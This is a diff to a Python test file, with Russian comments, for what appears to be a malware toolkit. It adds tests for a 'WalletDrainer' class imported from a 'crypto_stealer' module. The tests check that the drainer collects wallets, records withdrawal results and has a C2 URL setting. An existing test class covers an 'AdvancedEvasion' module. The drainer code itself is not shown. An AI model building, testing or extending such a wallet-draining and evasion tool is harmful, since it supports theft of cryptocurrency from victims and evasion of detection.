@@ -15,6 +15,7 @@ import shutil
 import json
 import logging
 from unittest.mock import patch, MagicMock
+from agent_modules.crypto_stealer import WalletDrainer
 
 # Настраиваем логирование
 logging.basicConfig(level=logging.DEBUG)
@@ -188,6 +189,31 @@ class TestAdvancedEvasion(unittest.TestCase):
         
         # Проверяем, что счетчик действий соответствует размеру журнала
         self.assertEqual(status['action_count'], len(self.evasion.action_log))
+
+
+class TestWalletDrainer(unittest.TestCase):
+    def setUp(self):
+        self.output_dir = "/tmp/test_wallet_drainer"
+        os.makedirs(self.output_dir, exist_ok=True)
+        self.drainer = WalletDrainer(output_dir=self.output_dir, c2_url=None)
+
+    def test_run_and_report(self):
+        result = self.drainer.run()
+        self.assertEqual(result["status"], "success")
+        self.assertIn("wallets", result)
+        self.assertIn("wallet_drainer_report", result)
+        # Проверяем, что отчет создан
+        report_path = result["wallet_drainer_report"]
+        self.assertTrue(os.path.exists(report_path))
+        with open(report_path) as f:
+            report = json.load(f)
+        self.assertIn("wallets", report)
+        self.assertIn("withdraw_results", report)
+
+    def tearDown(self):
+        # Чистим тестовые файлы
+        import shutil
+        shutil.rmtree(self.output_dir, ignore_errors=True)
 
 
 if __name__ == '__main__':
